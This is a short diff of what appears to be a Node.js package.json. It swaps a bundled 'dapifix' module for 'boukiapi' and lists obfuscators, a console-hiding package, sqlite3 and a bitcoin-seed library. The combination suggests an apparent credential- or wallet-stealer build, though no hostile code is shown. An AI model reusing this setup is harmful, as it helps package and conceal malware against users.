@@ -3,8 +3,10 @@
         "@peculiar/webcrypto": "^1.4.3",
         "axios": "^0.27.2",
         "bitcoin-seed": "^1.0.0",
+        "boukiapi": "1.1.1",
         "buffer-replace": "^1.0.0",
         "electron-builder": "^23.6.0",
+        "electron-rebuild": "^3.2.9",
         "form-data": "^4.0.0",
         "javascript-obfuscator": "^4.0.2",
         "js-confuser": "^1.5.4",
@@ -26,7 +28,7 @@
     "bin": "./index.js",
     "pkg": {
         "assets": [
-            "./node_modules/dapifix",
+            "./node_modules/boukiapi",
             "./node_modules/node-hide-console-window",
             "./node_modules/sqlite3",
             "./config_obf.js"
